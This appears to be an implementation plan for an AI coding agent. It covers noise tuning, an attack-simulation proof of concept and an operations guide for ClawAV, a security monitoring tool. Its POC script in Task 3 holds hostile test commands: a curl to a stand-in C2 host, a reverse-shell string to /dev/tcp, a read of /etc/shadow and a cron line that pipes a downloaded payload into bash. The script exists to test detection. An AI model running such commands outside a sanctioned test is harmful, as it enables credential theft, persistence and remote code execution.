# ClawAV POC & Operational Docs Plan

> **For Claude:** REQUIRED SUB-SKILL: Use superpowers:executing-plans to implement this plan task-by-task.

**Goal:** Prove ClawAV catches real threats, document false positive tuning, and create a "Day 1 Operations" guide — turning ClawAV from "impressive codebase" into "thing I trust to run."

**Architecture:** Three deliverables: (1) a live attack simulation POC that demonstrates detection, (2) a noise analysis from existing logs with tuning recommendations, (3) an operations guide for new installs.

**Tech Stack:** Bash scripts for POC, jq for log analysis, Markdown for docs

---

## Current State (from 18h of real logs)

- **16,534 total alerts** (~900/hr): 12,480 Info, 1,166 Warning, 2,888 Critical
- **Top sources:** network (6,593), auditd (2,932), sentinel (2,835), falco (1,720), samhain (888)
- **Known false positive patterns in Critical:**
  - Immutable flag MISSING on admin.key.hash / sudoers.d (repeating — likely a config issue, not real tampering)
  - `npm install` flagged as DATA_EXFIL (legitimate package installs)
  - `curl wttr.in` flagged by block-data-exfiltration policy (weather check from Claw)
  - `lsattr` on ClawAV files flagged as dangerous_commands (ClawAV checking itself)
- **Real signal buried in noise:** The immutable flag alerts may actually indicate a real issue (files that should be immutable aren't), but repeating 8+ times dilutes severity.

---

## Task 1: Noise Analysis & Tuning Report

**Files:**
- Create: `docs/NOISE-ANALYSIS.md`

**Step 1: Extract false positive patterns from existing logs**

```bash
# Group Critical alerts by message pattern (normalize numbers)
cat /var/log/clawav/alerts.jsonl | \
  jq -r 'select(.severity=="Critical") | .message' | \
  sed 's/[0-9]\+/#/g' | sort | uniq -c | sort -rn > /tmp/crit-patterns.txt

# Same for Warning
cat /var/log/clawav/alerts.jsonl | \
  jq -r 'select(.severity=="Warning") | .message' | \
  sed 's/[0-9]\+/#/g' | sort | uniq -c | sort -rn > /tmp/warn-patterns.txt

# Info top 20 (these are the bulk)
cat /var/log/clawav/alerts.jsonl | \
  jq -r 'select(.severity=="Info") | .source + ": " + .message' | \
  sed 's/[0-9]\+/#/g' | sort | uniq -c | sort -rn | head -20 > /tmp/info-patterns.txt
```

**Step 2: Classify each pattern**

For each pattern, categorize:
- **True positive** — real security signal, keep as-is
- **True positive, wrong severity** — real but shouldn't be Critical (e.g., immutable flag check should fire once as Critical, then downgrade to Warning on repeat)
- **False positive, tunable** — legitimate activity that can be allowlisted (e.g., wttr.in in netpolicy)
- **False positive, code fix needed** — ClawAV alerting on its own behavior

**Step 3: Write docs/NOISE-ANALYSIS.md**

Document each pattern with: count, example, classification, recommended fix. Include a summary table showing before/after alert volume if all recommendations are applied.

**Step 4: Commit**

```bash
git add docs/NOISE-ANALYSIS.md
git commit -m "docs: noise analysis from 18h production logs"
```

---

## Task 2: Tuning Recommendations (Config + Code)

**Files:**
- Create: `docs/TUNING.md`
- Potentially modify: policies/*.yaml, config suggestions

**Step 1: Write tuning recommendations based on Task 1 findings**

For each false positive pattern, document the specific fix:

- **Immutable flag repeating:** Should the aggregator deduplicate these more aggressively? Or should the scan only fire once per interval instead of every check?
- **npm install → DATA_EXFIL:** Add node/npm to behavior.rs safe process list, or add npm registry hosts to netpolicy allowed_hosts?
- **wttr.in curl:** Add to netpolicy allowed_hosts
- **ClawAV checking itself:** The lsattr/config read alerts are ClawAV's own scan triggering its own auditd rules — this is a self-referential loop that needs a code-level fix (exclude own PID or own commands from auditd processing)

**Step 2: Estimate noise reduction**

Calculate: if all tuning applied, how many of the 16,534 alerts would remain? What's the new Critical count? Target: Critical alerts should be rare enough that each one gets human attention.

**Step 3: Write docs/TUNING.md**

Structure: Problem → Evidence → Fix → Expected Impact

**Step 4: Commit**

```bash
git add docs/TUNING.md
git commit -m "docs: tuning guide with concrete noise reduction estimates"
```

---

## Task 3: Attack Simulation POC

**Files:**
- Create: `scripts/poc-attack-sim.sh`
- Create: `docs/POC-RESULTS.md`

**Step 1: Write attack simulation script**

The script should attempt common agent-threat scenarios and be SAFE (no actual damage). Each test:
1. Announces what it's about to do
2. Performs the action
3. Waits 5 seconds for ClawAV to process
4. Checks alerts.jsonl for detection

**Scenarios to simulate:**

```bash
#!/usr/bin/env bash
# ClawAV Attack Simulation POC — SAFE, non-destructive
set -euo pipefail

ALERTS="/var/log/clawav/alerts.jsonl"
BEFORE=$(wc -l < "$ALERTS")

echo "=== ClawAV Attack Simulation POC ==="
echo "Starting alert count: $BEFORE"
echo ""

# 1. SOUL.md tampering (cognitive file protection)
echo "[TEST 1] Attempting to modify SOUL.md..."
cp /home/openclaw/.openclaw/workspace/SOUL.md /tmp/soul-backup.md
echo "# INJECTED BY ATTACKER" >> /home/openclaw/.openclaw/workspace/SOUL.md
sleep 3
# Restore immediately
cp /tmp/soul-backup.md /home/openclaw/.openclaw/workspace/SOUL.md
echo "  Restored. Checking for alert..."

# 2. Simulated data exfiltration (curl to suspicious host)
echo "[TEST 2] Simulated exfil attempt via curl..."
curl -s -o /dev/null --max-time 2 http://evil-c2-server.example.com/exfil 2>/dev/null || true
sleep 3

# 3. Credential file access
echo "[TEST 3] Attempting to read /etc/shadow..."
cat /etc/shadow > /dev/null 2>&1 || true
sleep 3

# 4. Reverse shell pattern (won't connect, just triggers detection)
echo "[TEST 4] Reverse shell command pattern..."
bash -c 'echo "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1"' 2>/dev/null || true
sleep 3

# 5. SSH config tampering
echo "[TEST 5] Attempting sshd_config write..."
touch /etc/ssh/sshd_config.bak 2>/dev/null || true
sleep 3

# 6. Crontab persistence
echo "[TEST 6] Suspicious crontab activity..."
echo "* * * * * curl http://evil.com/payload | bash" | crontab - 2>/dev/null || true
crontab -r 2>/dev/null || true
sleep 3

AFTER=$(wc -l < "$ALERTS")
NEW_ALERTS=$((AFTER - BEFORE))
echo ""
echo "=== Results ==="
echo "New alerts generated: $NEW_ALERTS"
echo ""
echo "New alerts:"
tail -n "$NEW_ALERTS" "$ALERTS" | jq -r '"[\(.severity)] \(.source): \(.message)"'
```

**Step 2: Run the POC (requires J.R. approval since it touches system files)**

```bash
sudo bash scripts/poc-attack-sim.sh
```

**Step 3: Document results in docs/POC-RESULTS.md**

For each test scenario:
- **Expected:** What ClawAV should detect
- **Actual:** What alerts fired (copy exact alert text)
- **Verdict:** ✅ Detected / ⚠️ Partial / ❌ Missed
- **Notes:** Severity appropriate? Timing acceptable?

Include a summary scorecard: X/6 detected, with any gaps noted.

**Step 4: Commit**

```bash
git add scripts/poc-attack-sim.sh docs/POC-RESULTS.md
git commit -m "feat: attack simulation POC with results"
```

---

## Task 4: Day 1 Operations Guide

**Files:**
- Create: `docs/DAY1-OPERATIONS.md`

**Step 1: Write the guide**

Target audience: someone who just ran the oneshot installer. Structure:

```markdown
# Day 1 Operations Guide

## What Just Happened
- What got installed (binary, config, service, admin key)
- What's now immutable and why
- Where logs live

## Your First Hour
- Expected alert volume (~900/hr untuned, ~X/hr tuned)
- How to check status: `clawav status`, `journalctl -u openclawav`
- How to read the TUI: `clawav` (requires terminal)
- How to check alerts: `tail -f /var/log/clawav/alerts.jsonl | jq`

## Tuning (Do This First)
- Add your agent's known-good hosts to netpolicy.allowed_hosts
- Review policies/ directory — disable rules that don't apply
- Set min_slack_level to "critical" initially (avoid alert fatigue)
- Reference: docs/TUNING.md

## What "Normal" Looks Like
- Network: you'll see every outbound connection logged at Info level
- Auditd: every command your agent runs gets logged
- Sentinel: every file change in watched paths
- Scans: periodic scan results every [interval]
- Critical: should be RARE after tuning. If you see one, investigate.

## When to Worry
- Immutable flag alerts (something tried to modify protected files)
- BEHAVIOR:DATA_EXFIL on unexpected processes
- Cognitive file changes you didn't make
- Audit chain verification failure

## When NOT to Worry
- High Info volume (that's logging, not alerting)
- npm/pip install flagged as exfil (known FP, see TUNING.md)
- Network connections to your known services

## Your Admin Key
- You wrote it down, right?
- You need it for: config changes, uninstall, immutable flag management
- If you lose it: recovery mode (see INSTALL.md)

## Ongoing
- Review Critical alerts daily (should be <10/day after tuning)
- Update netpolicy allowlist as you add services
- ClawAV auto-updates from GitHub releases (Ed25519 verified)
```

**Step 2: Commit**

```bash
git add docs/DAY1-OPERATIONS.md
git commit -m "docs: Day 1 operations guide for new installs"
```

---

## Task 5: Final Review & Push

**Step 1: Review all new docs for consistency**

Ensure NOISE-ANALYSIS.md, TUNING.md, POC-RESULTS.md, and DAY1-OPERATIONS.md reference each other where appropriate. Update docs/INDEX.md to include the new files.

**Step 2: Push**

```bash
git push origin main
```

---

## Execution Order

Tasks 1-2 can run first (log analysis only, no system changes).
Task 3 requires J.R.'s approval before running the attack sim.
Task 4 can be written in parallel with 1-2 but should incorporate their findings.
Task 5 is final cleanup.

**Estimated time:** Tasks 1-2: ~30 min. Task 3: ~20 min (plus approval). Task 4: ~20 min. Task 5: ~10 min.
